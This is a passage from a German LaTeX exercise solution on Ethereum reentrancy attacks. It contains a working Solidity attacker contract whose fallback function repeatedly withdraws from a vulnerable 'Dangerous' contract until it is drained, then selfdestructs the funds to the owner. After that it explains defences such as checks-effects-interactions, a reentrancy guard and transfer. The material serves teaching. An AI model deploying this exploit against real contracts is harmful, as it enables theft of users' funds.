    }
}
\end{verbatim}

    \subsection*{2. Angreifer-Contract}

    \begin{verbatim}
pragma solidity ^0.4.24;

import "./Dangerous.sol"; // Assume Dangerous contract is in the same directory

contract Attacker {
    Dangerous public target;
    address public owner;

    constructor(address _target) public {
        target = Dangerous(_target);
        owner = msg.sender;
    }

    // Initiates the attack
    function attack(uint amount) public {
        target.withdraw(amount);
    }

    // Fallback function which is called when the target sends Ether to this contract
    function () external payable {
        if (address(target).balance > 0) {
            target.withdraw(address(target).balance);
        } else {
            selfdestruct(owner); // Transfer all Ether to the owner's account
        }
    }

    // Allows the contract to receive initial funds
    function fund() public payable {}
}
\end{verbatim}

    \textbf{e)}
    Um Reentrancy-Angriffe zu verhindern, gibt es verschiedene effektive Methoden. Hier sind einige der besten Ansätze:

    \subsection*{Checks-Effects-Interactions Pattern}

    Bei diesem Ansatz werden Änderungen am Zustand (Effekte) vor externen Aufrufen (Interaktionen) durchgeführt. Im \texttt{Dangerous} Contract sollte der Zustand des \texttt{deposits} Mappings geändert werden, bevor der \texttt{call} ausgeführt wird.

    \subsection*{Reentrancy Guard}

    Ein Mutex (eine Sperre) kann implementiert werden, um sicherzustellen, dass die \texttt{withdraw} Funktion nicht mehrfach gleichzeitig aufgerufen werden kann.

    \subsection*{Verwendung von \texttt{transfer} anstelle von \texttt{call}}

    Die Verwendung von \texttt{transfer} ist sicherer, da es eine feste Gasmenge (2300 Gas) weiterleitet, die nicht ausreicht, um komplexe Funktionen auszuführen, was Reentrancy-Angriffe erschwert.

\end{exercise}

\end{document}
